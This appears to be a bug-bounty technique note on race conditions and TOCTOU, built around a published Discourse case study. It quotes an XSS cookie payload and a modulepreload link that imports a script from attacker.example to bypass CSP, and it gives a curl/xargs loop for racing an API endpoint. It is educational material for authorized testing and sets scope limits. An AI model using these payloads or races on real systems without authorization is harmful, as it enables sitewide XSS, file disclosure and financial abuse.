---
title: Race conditions and TOCTOU
date: 2026-10-16
type: technique
status: current
verified: 2026-10-16
sources:
  - https://www.slcyber.io/research/a-jpeg-a-race-and-a-ghost-breaking-discourses-image-pipeline (GET, 2026-10-07)
  - https://www.slcyber.io/research-blog (index, GET)
---

# Race conditions and TOCTOU

**Fresh lookup, 2026-10-16.** Primary source: Searchlight's *A JPEG, a Race, and
a Ghost: Breaking Discourse's Image Pipeline* (2026-10-07).

## What a race condition is

Two operations that must happen in order, where the program lets you interleave
them. Classic TOCTOU — time-of-check to time-of-use:

```text
check: does /uploads/abc.jpg exist?      -> no
      <-- you upload your own file here -->
use:   write to /uploads/abc.jpg          -> overwrites
```

The window between check and use is the bug. Some kind of synchronization
primitive belongs there and doesn't.

## Where they hide

- **File upload / image pipelines** — the richest source. Validate-then-store.
- **Discount / coupon / balance checks** — check remaining balance, then deduct.
- **Invite and one-time token redemption** — check unused, then mark used.
- **Email uniqueness / username registration** — check exists, then insert.
- **Payment and refund flows** — the double-spend pattern.
- **Session and lock handling** — two concurrent requests through a lock.

## The Discourse case study (2026)

Worth reading in full: `https://www.slcyber.io/research/a-jpeg-a-race-and-a-ghost-breaking-discourses-image-pipeline`

Two independent bugs in default Discourse configuration:

**1. Arbitrary file read via TOCTOU in the image upload pipeline.** Required only
a Trust Level 0 account. The upload pipeline validated and then processed the
file, and concurrent requests raced between those steps — uploading a file the
validator hadn't yet seen, then having the pipeline read the pre-upload contents.

**2. Sitewide cache poisoning escalating to XSS for every anonymous visitor.** The
mechanism is the reusable part:

- An unkeyed cookie (`color_scheme_id`) was reflected into HTML.
- The value was *validated* via `ColorScheme.find_by_id(scheme_id)` — Rails casts
  the string to an integer for the SQL query, so `2"><img src=x onerror=...>`
  validates as id `2` and passes — **but the original uncast string is what gets
  interpolated into the response**.
- On its own that's self-XSS. What escalates it: Discourse's anonymous cache key
  included path, `Accept`, scheme, host and `User-Agent` — but **not the
  `color_scheme_id` cookie**. Poison the cache, and every later anonymous visitor
  with that User-Agent gets the payload.

**The generalizable lesson: type-casting validation followed by use of the raw
value is a bug**, independent of language or framework. Find a place where a
value is checked in one form and used in another.

## CSP bypass that turned XSS into sitewide XSS

The payload alone wasn't enough — Discourse ran `script-src 'nonce-...' 'strict-dynamic'`.
Under `strict-dynamic`, allowlists are ignored; the browser trusts scripts created
by an already-trusted script. A raw `<script>` does nothing.

The researchers read Discourse's *own* trusted boot script, which does:

```js
[...document.querySelectorAll("link[rel=modulepreload][data-plugin-name]")]
  .map(async (e) => (await import(e.href)).default)
```

It finds any `<link rel="modulepreload" data-plugin-name="...">` and dynamically
imports its `href`. So injecting

```html
<link rel="modulepreload" data-plugin-name="poc" href="https://attacker.example/xss.js">
```

hijacks the selector. The trusted script imports the attacker's module, which
executes with full first-party trust. The attacker's server must send matching
CORS headers.

Two transferable techniques here: **(a) the injected content sits in `<head>`,
before trusted scripts run — ideal DOM position; (b) collections like
GMSGadget document known gadgets, but the specific gadget is usually in the
target's own code, so read it.**

## How to test

```bash
# concurrent requests to the same endpoint. These MUST be same-line.
seq 1 100 | xargs -P 50 -I{} curl -s -o /dev/null -w "%{http_code}\n" \
  -H "Authorization: Bearer $TOKEN" "https://target/api/claim?code=ABC"
```

Higher concurrency finds narrower windows. `-P 50` to `-P 200`.

In Burp: **Turbo Intruder** is built for this — it sends requests in parallel with
synchronisation barriers between arrival at a barrier and release. The WebSocket
Turbo Intruder extension (`https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine`)
does the same for WebSocket protocols.

The barrier is what makes TOCTOU reachable: you want request B's check to run
between A's check and A's use. Random concurrency alone usually loses.

## Rate limits and scope

Concurrency is still traffic. Every program rate limit applies, and race
conditions are the easiest way to trip one accidentally — 200 concurrent requests
looks like an attack, and on a shared program it can be mistaken for one.

- Ask before running high-concurrency tests. Say what the concurrency is and why.
- Prefer a low-concurrency run first (10) to see if the window is wide at all.
- Record the concurrency in `notes.md` so the operator can explain it if their
  monitoring fired.

## Proof rules

- Use data **you created**. Racing two of your own uploads proves the primitive
  without touching anyone's data.
- Never race a payment, refund, or balance in a way that could cost someone money.
- No DoS. A race that reliably crashes a worker is an availability finding at
  best and a program violation at worst.

## Reporting

Rate on impact, not on elegance. "Read arbitrary files including config with one
account" is a high-severity finding no matter how narrow the window. Show the
PoC loop and state the concurrency required — a triager needs to reproduce it,
and if they can't, they'll close it as unproven rather than as low severity.